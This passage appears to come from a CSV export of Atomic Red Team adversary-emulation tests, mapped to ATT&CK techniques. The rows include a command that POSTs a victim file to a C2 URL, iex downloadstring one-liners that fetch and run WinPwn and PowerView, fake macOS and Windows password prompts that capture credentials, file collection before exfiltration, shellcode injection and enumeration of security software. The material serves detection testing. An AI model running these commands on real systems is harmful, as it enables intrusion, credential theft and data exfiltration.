$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
",,"dependencies.0.description: InstallUtil test harness script must be installed at specified location (#{test_harness})

dependencies.0.prereq_command: if (Test-Path ""#{test_harness}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{test_harness}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile ""#{test_harness}""

","input_arguments.test_harness.description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly

input_arguments.test_harness.type: path

input_arguments.test_harness.default: PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1

input_arguments.assembly_dir.description: directory to drop the compiled installer assembly

input_arguments.assembly_dir.type: path

input_arguments.assembly_dir.default: $Env:TEMP\

input_arguments.invocation_method.description: the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable

input_arguments.invocation_method.type: string

input_arguments.invocation_method.default: Executable

input_arguments.assembly_filename.description: filename of the compiled installer assembly

input_arguments.assembly_filename.type: string

input_arguments.assembly_filename.default: T1218.004.dll

"
T1218.004,Signed Binary Proxy Execution: InstallUtil,InstallUtil evasive invocation,559e6d06-bb42-4307-bff7-3b95a8254bad,"Executes an InstallUtil assembly by renaming InstallUtil.exe and using a nonstandard extension for the assembly. Upon execution, ""Running a transacted installation.""
will be displayed, along with other information about the opperation. ""The transacted install has completed."" will be displayed upon completion.
",windows,,,"# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. ""#{test_harness}""

$InstallerAssemblyDir = ""$Env:windir\System32\Tasks""
$InstallerAssemblyFileName = 'readme.txt'
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = ""readme.txt""
$ExpectedOutput = 'Constructor_'

# Explicitly set the directory so that a relative path to readme.txt can be supplied.
Set-Location ""$Env:windir\System32\Tasks""

Copy-Item -Path ""$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe"" -Destination ""$Env:windir\System32\Tasks\notepad.exe""

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = 'Executable'
    CommandLine = $CommandLine
    InstallUtilPath = ""$Env:windir\System32\Tasks\notepad.exe""
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @""
Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
""@
}
",powershell,,,"Remove-Item -Path ""$Env:windir\System32\Tasks\readme.txt"" -ErrorAction Ignore
Remove-Item -Path ""$Env:windir\System32\Tasks\readme.InstallLog"" -ErrorAction Ignore
Remove-Item -Path ""$Env:windir\System32\Tasks\readme.InstallState"" -ErrorAction Ignore
Remove-Item -Path ""$Env:windir\System32\Tasks\notepad.exe"" -ErrorAction Ignore
",,"dependencies.0.description: InstallUtil test harness script must be installed at specified location (#{test_harness})

dependencies.0.prereq_command: if (Test-Path ""#{test_harness}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{test_harness}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile ""#{test_harness}""

","input_arguments.test_harness.description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly

input_arguments.test_harness.type: path

input_arguments.test_harness.default: PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1

"
T1005,Data from Local System,Search files of interest and save them to a single zip file (Windows),d3d9af44-b8ad-4375-8b0a-4bff4b7e419c,"This test searches for files of certain extensions and saves them to a single zip file prior to extraction.                              
",windows,,,"$startingDirectory = ""#{starting_directory}""
$outputZip = ""#{output_zip_folder_path}""
$fileExtensionsString = ""#{file_extensions}"" 
$fileExtensions = $fileExtensionsString -split "", ""

New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null

Function Search-Files {
  param (
    [string]$directory
  )
  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
    $fileExtensions -contains $_.Extension.ToLower()
  }
  return $files
}

$foundFiles = Search-Files -directory $startingDirectory
if ($foundFiles.Count -gt 0) {
  $foundFilePaths = $foundFiles.FullName
  Compress-Archive -Path $foundFilePaths -DestinationPath ""$outputZip\data.zip""

  Write-Host ""Zip file created: $outputZip\data.zip""
  } else {
      Write-Host ""No files found with the specified extensions.""
  }
",powershell,False,,"Remove-Item -Path  $outputZip\data.zip -Force
",,,"input_arguments.starting_directory.description: Path to starting directory for the search

input_arguments.starting_directory.type: Path

input_arguments.starting_directory.default: C:\Users

input_arguments.output_zip_folder_path.description: Path to directory for saving the generated zip file

input_arguments.output_zip_folder_path.type: Path

input_arguments.output_zip_folder_path.default: PathToAtomicsFolder\..\ExternalPayloads\T1005

input_arguments.file_extensions.description: List of file extensions to be searched and zipped, separated by comma and space

input_arguments.file_extensions.type: string

input_arguments.file_extensions.default: .doc, .docx, .txt

"
T1005,Data from Local System,Find and dump sqlite databases (Linux),00cbb875-7ae4-4cf1-b638-e543fd825300,"An adversary may know/assume that the user of a system uses sqlite databases which contain interest and sensitive data. In this test we download two databases and a sqlite dump script, then run a find command to find & dump the database content.
",linux,,,"cd $HOME
curl -O #{remote_url}/art
curl -O #{remote_url}/gta.db
curl -O #{remote_url}/sqlite_dump.sh
chmod +x sqlite_dump.sh
find . ! -executable -exec bash -c 'if [[ ""$(head -c 15 {} | strings)"" == ""SQLite format 3"" ]]; then echo ""{}""; ./sqlite_dump.sh {}; fi' \;
",bash,False,,"rm -f $HOME/.art
rm -f $HOME/gta.db
rm -f $HOME/sqlite_dump.sh 
",,"dependencies.0.description: Check if running on a Debian based machine.

dependencies.0.prereq_command: if [ -x ""$(command -v sqlite3)"" ]; then echo ""sqlite3 is installed""; else echo ""sqlite3 is NOT installed""; exit 1; fi
if [ -x ""$(command -v curl)"" ]; then echo ""curl is installed""; else echo ""curl is NOT installed""; exit 1; fi
if [ -x ""$(command -v strings)"" ]; then echo ""strings is installed""; else echo ""strings is NOT installed""; exit 1; fi

dependencies.0.get_prereq_command: if grep -iq ""debian\|ubuntu\|kali\|mint"" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
if grep -iq ""rhel\|fedora\|centos"" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi

","input_arguments.remote_url.description: url of remote payload

input_arguments.remote_url.type: url

input_arguments.remote_url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src

"
T1041,Exfiltration Over C2 Channel,C2 Data Exfiltration,d1253f6e-c29b-49dc-b466-2147a6191932,"Exfiltrates a file present on the victim machine to the C2 server.
",windows,,,"if(-not (Test-Path #{filepath})){ 
  1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value ""This is line $_."" }
}
[System.Net.ServicePointManager]::Expect100Continue = $false
$filecontent = Get-Content -Path #{filepath}
Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive
",powershell,,,,,,"input_arguments.destination_url.description: Destination URL to post encoded data.

input_arguments.destination_url.type: string

input_arguments.destination_url.default: example.com

input_arguments.filepath.description: The file which is being exfiltrated to the C2 Server.

input_arguments.filepath.type: path

input_arguments.filepath.default: $env:TEMP\LineNumbers.txt

"
T1055.004,Process Injection: Asynchronous Procedure Call,Process Injection via C#,611b39b7-e243-4c81-87a4-7145a90358b1,"Process Injection using C#
reference: https://github.com/pwndizzle/c-sharp-memory-injection
Excercises Five Techniques
1. Process injection
2. ApcInjectionAnyProcess
3. ApcInjectionNewProcess
4. IatInjection
5. ThreadHijack
Upon successful execution, cmd.exe will execute T1055.exe, which exercises 5 techniques. Output will be via stdout.
",windows,,,"""#{exe_binary}""
",command_prompt,,,,powershell,"dependencies.0.description: #{exe_binary} must be exist on system.

dependencies.0.prereq_command: if (Test-Path ""#{exe_binary}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{exe_binary}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.004/bin/T1055.exe"" -OutFile ""#{exe_binary}""

","input_arguments.exe_binary.description: Output Binary

input_arguments.exe_binary.type: path

input_arguments.exe_binary.default: PathToAtomicsFolder\T1055.004\bin\T1055.exe

"
T1055.004,Process Injection: Asynchronous Procedure Call,EarlyBird APC Queue Injection in Go,73785dd2-323b-4205-ab16-bb6f06677e14,"Creates a process in a suspended state and calls QueueUserAPC WinAPI to add a UserAPC to the child process that points to allocated shellcode. 
ResumeThread is called which then calls NtTestAlert to execute the created UserAPC which then executes the shellcode.
This technique allows for the early execution of shellcode and potentially before AV/EDR can hook functions to support detection.
- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createprocesswithpipe)
- References: 
  - https://www.bleepingcomputer.com/news/security/early-bird-code-injection-technique-helps-malware-stay-undetected/
  - https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection
",windows,,,"$PathToAtomicsFolder\T1055.004\bin\x64\EarlyBird.exe -program ""#{spawn_process_path}"" -debug
",powershell,False,,"Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
Stop-Process -Name ""#{spawn_process_name}"" -ErrorAction SilentlyContinue
",,,"input_arguments.spawn_process_path.description: Path of the binary to spawn

input_arguments.spawn_process_path.type: string

input_arguments.spawn_process_path.default: C:\Windows\System32\werfault.exe

input_arguments.spawn_process_name.description: Name of the process to spawn

input_arguments.spawn_process_name.type: string

input_arguments.spawn_process_name.default: werfault

"
T1055.004,Process Injection: Asynchronous Procedure Call,Remote Process Injection with Go using NtQueueApcThreadEx WinAPI,4cc571b1-f450-414a-850f-879baf36aa06,"Uses the undocumented NtQueueAPCThreadEx WinAPI to create a ""Special User APC"" in the current thread of the current process to execute shellcode. 
Since the shellcode is loaded and executed in the current process it is considered local shellcode execution.

Steps taken with this technique
1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
3. Change the memory page permissions to Execute/Read with VirtualProtect
4. Get a handle to the current thread
5. Execute the shellcode in the current thread by creating a Special User APC through the NtQueueApcThreadEx function

- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#rtlcreateuserthread)
- References:
  - https://repnz.github.io/posts/apc/user-apc/
  - https://docs.rs/ntapi/0.3.1/ntapi/ntpsapi/fn.NtQueueApcThreadEx.html
  - https://0x00sec.org/t/process-injection-apc-injection/24608
  - https://twitter.com/aionescu/status/992264290924032005
  - http://www.opening-windows.com/techart_windows_vista_apc_internals2.htm#_Toc229652505
",windows,,,"$PathToAtomicsFolder\T1055.004\bin\x64\NtQueueApcThreadEx.exe -debug
",powershell,False,,Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue,,,
T1518.001,Software Discovery: Security Software Discovery,Security Software Discovery,f92a380f-ced9-491f-b338-95a991418ce2,"Methods to identify Security Software on an endpoint

when sucessfully executed, the test is going to display running processes, firewall configuration on network profiles
and specific security software.
",windows,,,"netsh.exe advfirewall  show allprofiles 
netsh.exe advfirewall firewall dump
netsh.exe advfirewall show currentprofile
netsh.exe advfirewall firewall show rule name=all
netsh.exe firewall show state
netsh.exe firewall show config
sc query windefend
powershell.exe /c ""Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }""
powershell.exe /c ""Get-Service | where-object {$_.DisplayName -like '*sysm*'}""
powershell.exe /c ""Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''""
tasklist.exe
tasklist.exe | findstr /i virus
tasklist.exe | findstr /i cb
tasklist.exe | findstr /i defender
tasklist.exe | findstr /i cylance
tasklist.exe | findstr /i mc
tasklist.exe | findstr /i ""virus cb defender cylance mc""
",command_prompt,,,,,,
T1518.001,Software Discovery: Security Software Discovery,Security Software Discovery - powershell,7f566051-f033-49fb-89de-b6bacab730f0,"Methods to identify Security Software on an endpoint

when sucessfully executed, powershell is going to processes related AV products if they are running.
Note that, depending on the privilege of current user, get-process | ?{$_.Description -like ""*""} may not return the processes related to AV products of the check.
For instance, only with Administrator right, you can see the process description of McAffee processes. Hence, it is better to use get-process | ?{$_.ProcessName -like ""*""},
if you know the name of those processes.
",windows,,,"get-process | ?{$_.Description -like ""*virus*""}
get-process | ?{$_.Description -like ""*carbonblack*""}
get-process | ?{$_.Description -like ""*defender*""}
get-process | ?{$_.Description -like ""*cylance*""}
get-process | ?{$_.Description -like ""*mc*""}
get-process | ?{$_.ProcessName -like ""*mc*""}
get-process | Where-Object { $_.ProcessName -eq ""Sysmon"" }
",powershell,,,,,,
T1518.001,Software Discovery: Security Software Discovery,Security Software Discovery - ps (macOS),ba62ce11-e820-485f-9c17-6f3c857cd840,"Methods to identify Security Software on an endpoint
when sucessfully executed, command shell  is going to display AV/Security software it is running.
",macos,,,"ps aux | egrep 'Little\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu'
",sh,,,,,,
T1518.001,Software Discovery: Security Software Discovery,Security Software Discovery - ps (Linux),23b91cd2-c99c-4002-9e41-317c63e024a2,"Methods to identify Security Software on an endpoint
when sucessfully executed, command shell  is going to display AV/Security software it is running.
",linux,,,"ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd'
",sh,,,,,,
T1518.001,Software Discovery: Security Software Discovery,Security Software Discovery - pgrep (FreeBSD),fa96c21c-5fd6-4428-aa28-51a2fbecdbdc,"Methods to identify Security Software on an endpoint
when sucessfully executed, command shell is going to display AV/Security software it is running.
",linux,,,"pgrep -l 'bareos-fd|icinga2|cbagentd|wazuh-agent|packetbeat|filebeat|osqueryd'
",sh,,,,,,
T1518.001,Software Discovery: Security Software Discovery,Security Software Discovery - Sysmon Service,fe613cf3-8009-4446-9a0f-bc78a15b66c9,"Discovery of an installed Sysinternals Sysmon service using driver altitude (even if the name is changed).

when sucessfully executed, the test is going to display sysmon driver instance if it is installed.
",windows,,,"fltmc.exe | findstr.exe 385201
",command_prompt,True,,,,,
T1518.001,Software Discovery: Security Software Discovery,Security Software Discovery - AV Discovery via WMI,1553252f-14ea-4d3b-8a08-d7a4211aa945,"Discovery of installed antivirus products via a WMI query.

when sucessfully executed, the test is going to display installed AV software.
",windows,,,wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List,command_prompt,True,,,,,
T1518.001,Software Discovery: Security Software Discovery,Security Software Discovery - AV Discovery via Get-CimInstance and Get-WmiObject cmdlets,015cd268-996e-4c32-8347-94c80c6286ee,"Discovery of installed antivirus products via Get-CimInstance and Get-WmiObject cmdlets of powershell.

when sucessfully executed, information about installed AV software is displayed..
",windows,,,"powershell Get-CimInstance -Namespace root/securityCenter2 -classname antivirusproduct
powershell Get-WmiObject -Namespace root\securitycenter2 -Class antivirusproduct
",command_prompt,True,,,,,
T1518.001,Software Discovery: Security Software Discovery,Security Software Discovery - Windows Defender Enumeration,d3415a0e-66ef-429b-acf4-a768876954f6,"Windows Defender Enumeration via different built-in windows native tools.
when sucessfully executed, information about windows defender is displayed.
",windows,,,"Get-Service WinDefend #check the service state of Windows Defender
Get-MpComputerStatus #provides the current status of security solution elements, including Anti-Spyware, Antivirus, LoavProtection, Real-time protection, etc
Get-MpThreat #threats details that have been detected using MS Defender
",powershell,True,,,,,
T1518.001,Software Discovery: Security Software Discovery,Security Software Discovery - Windows Firewall Enumeration,9dca5a1d-f78c-4a8d-accb-d6de67cfed6b,"Enumerates windows firewall to retrieves firewall rules from the target computer.

when sucessfully executed, details of windows firewall is displayed.
",windows,,,"Get-NetFirewallProfile | Format-Table Name, Enabled
Get-NetFirewallSetting
Get-NetFirewallRule | select DisplayName, Enabled, Description
",powershell,True,,,,,
T1059.007,Command and Scripting Interpreter: JavaScript,JScript execution to gather local computer information via cscript,01d75adf-ca1b-4dd1-ac96-7c9550ad1035,"JScript execution test, execute JScript via cscript command. When successful, system information will be written to $env:TEMP\T1059.007.out.txt",windows,,,"cscript ""#{jscript}"" > %tmp%\T1059.007.out.txt
",command_prompt,,,del %tmp%\T1059.007.out.txt >nul 2>&1,powershell,"dependencies.0.description: Sample script must exist on disk at specified location (#{jscript})
dependencies.0.prereq_command: if (Test-Path ""#{jscript}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -ItemType Directory (Split-Path ""#{jscript}"") -Force | Out-Null
Invoke-WebRequest ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.007/src/sys_info.js"" -OutFile ""#{jscript}""
","input_arguments.jscript.description: Path to sample script

input_arguments.jscript.type: string

input_arguments.jscript.default: PathToAtomicsFolder\T1059.007\src\sys_info.js

"
T1059.007,Command and Scripting Interpreter: JavaScript,JScript execution to gather local computer information via wscript,0709945e-4fec-4c49-9faf-c3c292a74484,"JScript execution test, execute JScript via wscript command. When successful, system information will be shown with four message boxes.",windows,,,"wscript ""#{jscript}""
",command_prompt,,,,powershell,"dependencies.0.description: Sample script must exist on disk at specified location (#{jscript})
dependencies.0.prereq_command: if (Test-Path ""#{jscript}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -ItemType Directory (Split-Path ""#{jscript}"") -Force | Out-Null
Invoke-WebRequest ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.007/src/sys_info.js"" -OutFile ""#{jscript}""
","input_arguments.jscript.description: Path to sample script

input_arguments.jscript.type: string

input_arguments.jscript.default: PathToAtomicsFolder\T1059.007\src\sys_info.js

"
T1056.002,Input Capture: GUI Input Capture,AppleScript - Prompt User for Password,76628574-0bc1-4646-8fe2-8f4427b47d15,"Prompt User for Password (Local Phishing)
Reference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html
",macos,,,"osascript -e 'tell app ""System Preferences"" to activate' -e 'tell app ""System Preferences"" to activate' -e 'tell app ""System Preferences"" to display dialog ""Software Update requires that you type your password to apply changes."" & return & return  default answer """" with icon 1 with hidden answer with title ""Software Update""'
",bash,,,,,,
T1056.002,Input Capture: GUI Input Capture,PowerShell - Prompt User for Password,2b162bfd-0928-4d4c-9ec3-4d9f88374b52,"Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.

Reference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py
",windows,,,"# Creates GUI to prompt for password. Expect long pause before prompt is available.    
$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)
# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.
write-warning $cred.GetNetworkCredential().Password
",powershell,,,,,,
T1056.002,Input Capture: GUI Input Capture,AppleScript - Spoofing a credential prompt using osascript,b7037b89-947a-427a-ba29-e7e9f09bc045,"Prompt user for password without requiring permissions to send Apple events to System Settings.
https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/
",macos,,,"PWD_SPOOF=$(osascript -e 'display dialog ""To perform a security update MacOS needs your passphrase."" with title ""MacOS Security Update"" default answer """" with icon stop with hidden answer')
echo $PWD_SPOOF
",bash,,,,,,
T1217,Browser Bookmark Discovery,List Mozilla Firefox Bookmark Database Files on FreeBSD/Linux,3a41f169-a5ab-407f-9269-abafdb5da6c2,"Searches for Mozilla Firefox's places.sqlite file (on FreeBSD or Linux distributions) that contains bookmarks and lists any found instances to a text file.
",linux,,,"find / -path ""*.mozilla/firefox/*/places.sqlite"" 2>/dev/null -exec echo {} >> #{output_file} \;
cat #{output_file} 2>/dev/null
",sh,,,"rm -f #{output_file} 2>/dev/null
",,,"input_arguments.output_file.description: Path where captured results will be placed.

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1217-Firefox.txt

"
T1217,Browser Bookmark Discovery,List Mozilla Firefox Bookmark Database Files on macOS,1ca1f9c7-44bc-46bb-8c85-c50e2e94267b,"Searches for Mozilla Firefox's places.sqlite file (on macOS) that contains bookmarks and lists any found instances to a text file.
",macos,,,"find / -path ""*/Firefox/Profiles/*/places.sqlite"" -exec echo {} >> #{output_file} \;
cat #{output_file} 2>/dev/null
",sh,,,"rm -f #{output_file} 2>/dev/null
",,,"input_arguments.output_file.description: Path where captured results will be placed.

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1217_Firefox.txt

"
T1217,Browser Bookmark Discovery,List Google Chrome Bookmark JSON Files on macOS,b789d341-154b-4a42-a071-9111588be9bc,"Searches for Google Chrome's Bookmark file (on macOS) that contains bookmarks in JSON format and lists any found instances to a text file.
",macos,,,"find / -path ""*/Google/Chrome/*/Bookmarks"" -exec echo {} >> #{output_file} \;
cat #{output_file} 2>/dev/null
",sh,,,"rm -f #{output_file} 2>/dev/null
",,,"input_arguments.output_file.description: Path where captured results will be placed.

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1217-Chrome.txt

"
T1217,Browser Bookmark Discovery,List Google Chromium Bookmark JSON Files on FreeBSD,88ca025b-3040-44eb-9168-bd8af22b82fa,"Searches for Google Chromium's Bookmark file (on FreeBSD) that contains bookmarks in JSON format and lists any found instances to a text file.
",linux,,,"find / -path ""*/.config/chromium/*/Bookmarks"" -exec echo {} >> #{output_file} \;
cat #{output_file} 2>/dev/null
",sh,,,"rm -f #{output_file} 2>/dev/null
",,,"input_arguments.output_file.description: Path where captured results will be placed.

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1217-Chrome.txt

"
T1217,Browser Bookmark Discovery,List Google Chrome / Opera Bookmarks on Windows with powershell,faab755e-4299-48ec-8202-fc7885eb6545,"Searches for Google Chrome's and Opera's Bookmarks file (on Windows distributions) that contains bookmarks.
Upon execution, paths that contain bookmark files will be displayed.
",windows,,,"Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force
",powershell,,,,,,
T1217,Browser Bookmark Discovery,List Google Chrome / Edge Chromium Bookmarks on Windows with command prompt,76f71e2f-480e-4bed-b61e-398fe17499d5,"Searches for Google Chromes's and Edge Chromium's Bookmarks file (on Windows distributions) that contains bookmarks.
Upon execution, paths that contain bookmark files will be displayed.
",windows,,,"where /R C:\Users\ Bookmarks
",command_prompt,,,,,,
T1217,Browser Bookmark Discovery,List Mozilla Firefox bookmarks on Windows with command prompt,4312cdbc-79fc-4a9c-becc-53d49c734bc5,"Searches for Mozilla Firefox bookmarks file (on Windows distributions) that contains bookmarks in a SQLITE database.
Upon execution, paths that contain bookmark files will be displayed.
",windows,,,"where /R C:\Users\ places.sqlite
",command_prompt,,,,,,
T1217,Browser Bookmark Discovery,List Internet Explorer Bookmarks using the command prompt,727dbcdb-e495-4ab1-a6c4-80c7f77aef85,This test will list the bookmarks for Internet Explorer that are found in the Favorites folder,windows,,,"dir /s /b %USERPROFILE%\Favorites
",command_prompt,,,,,,
T1217,Browser Bookmark Discovery,List Safari Bookmarks on MacOS,5fc528dd-79de-47f5-8188-25572b7fafe0,"This test searches for Safari's Bookmarks file (on macOS) and lists any found instances to a text file.
",macos,,,"find / -path ""*/Safari/Bookmarks.plist"" 2>/dev/null >> #{output_file} 
cat #{output_file} 
",sh,,,"rm -f #{output_file} 2>/dev/null
",,,"input_arguments.output_file.description: Path where captured results will be placed.

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1217-Safari.txt

"
T1135,Network Share Discovery,Network Share Discovery,f94b5ad9-911c-4eff-9718-fd21899db4f7,"Network Share Discovery
",macos,,,"df -aH
smbutil view -g //#{computer_name}
showmount #{computer_name}
",sh,,,,,,"input_arguments.computer_name.description: Computer name to find a mount on.

input_arguments.computer_name.type: string

input_arguments.computer_name.default: computer1

"
T1135,Network Share Discovery,Network Share Discovery - linux,875805bc-9e86-4e87-be86-3a5527315cae,"Network Share Discovery using smbstatus
",linux,,,"sudo smbstatus --shares
",bash,True,,,bash,"dependencies.0.description: Package with smbstatus (samba) must exist on device

dependencies.0.prereq_command: if #{package_checker} > /dev/null; then exit 0; else exit 1; fi

dependencies.0.get_prereq_command: sudo #{package_installer} 

","input_arguments.package_checker.description: Package checking command. Debian - dpkg -s samba

input_arguments.package_checker.type: string

input_arguments.package_checker.default: (rpm -q samba &>/dev/null) || (dpkg -s samba | grep -q installed)

input_arguments.package_installer.description: Package installer command. Debian - apt install samba

input_arguments.package_installer.type: string

input_arguments.package_installer.default: (which yum && yum -y install epel-release samba)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y samba)

"
T1135,Network Share Discovery,Network Share Discovery - FreeBSD,77e468a6-3e5c-45a1-9948-c4b5603747cb,"Network Share Discovery using smbstatus
",linux,,,"smbstatus --shares
",sh,True,,,sh,"dependencies.0.description: Package with smbstatus (samba) must exist on device

dependencies.0.prereq_command: if #{package_checker} > /dev/null; then exit 0; else exit 1; fi

dependencies.0.get_prereq_command: #{package_installer} 

","input_arguments.package_checker.description: Package checking command. pkg info -x samba

input_arguments.package_checker.type: string

input_arguments.package_checker.default: (pkg info -x samba &>/dev/null)

input_arguments.package_installer.description: Package installer command. pkg install -y samba413

input_arguments.package_installer.type: string

input_arguments.package_installer.default: (which pkg && pkg install -y samba413)

"
T1135,Network Share Discovery,Network Share Discovery command prompt,20f1097d-81c1-405c-8380-32174d493bbb,"Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host
Upon execution avalaible network shares will be displayed in the powershell session
",windows,,,"net view \\#{computer_name}
",command_prompt,,,,,,"input_arguments.computer_name.description: Computer name to find a mount on.

input_arguments.computer_name.type: string

input_arguments.computer_name.default: localhost

"
T1135,Network Share Discovery,Network Share Discovery PowerShell,1b0814d1-bb24-402d-9615-1b20c50733fb,"Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host
Upon execution, avalaible network shares will be displayed in the powershell session
",windows,,,"get-smbshare
",powershell,,,,,,
T1135,Network Share Discovery,View available share drives,ab39a04f-0c93-4540-9ff2-83f862c385ae,"View information about all of the resources that are shared on the local computer Upon execution, avalaible share drives will be displayed in the powershell session",windows,,,"net share
",command_prompt,,,,,,
T1135,Network Share Discovery,Share Discovery with PowerView,b1636f0a-ba82-435c-b699-0d78794d8bfd,"Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
",powershell,,,,powershell,"dependencies.0.description: Endpoint must be joined to domain

dependencies.0.prereq_command: if ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: ""Join system to domain""

",
T1135,Network Share Discovery,PowerView ShareFinder,d07e4cc1-98ae-447e-9d31-36cb430d28c4,PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.,windows,,,"Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1""
Invoke-ShareFinder #{parameters}
",powershell,,,,,"dependencies.0.description: Invoke-ShareFinder module must exist in %TEMP% directory
dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1""

","input_arguments.parameters.description: ShareFinder parameter

input_arguments.parameters.type: string

input_arguments.parameters.default: -CheckShareAccess

"
T1135,Network Share Discovery,WinPwn - shareenumeration,987901d1-5b87-4558-a6d9-cffcabc638b8,Network share enumeration using the shareenumeration function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
shareenumeration -noninteractive -consoleoutput",powershell,,,,,,
T1135,Network Share Discovery,Network Share Discovery via dir command,13daa2cf-195a-43df-a8bd-7dd5ffb607b5,"Network Share Discovery utilizing the dir command prompt. The computer ip variable may need to be modified to point to a different host ip
Upon execution avalaible network shares will be displayed in the commandline session
",windows,,,"dir \\#{computer_ip}\c$
dir \\#{computer_ip}\admin$
dir \\#{computer_ip}\IPC$
",command_prompt,,,,,,"input_arguments.computer_ip.description: Computer IP to find a mount on.

input_arguments.computer_ip.type: string

input_arguments.computer_ip.default: 127.0.0.1

"
T1021.006,Remote Services: Windows Remote Management,Enable Windows Remote Management,9059e8de-3d7d-4954-a322-46161880b9cf,"Powershell Enable WinRM

Upon successful execution, powershell will ""Enable-PSRemoting"" allowing for remote PS access.
",windows,,,"Enable-PSRemoting -Force
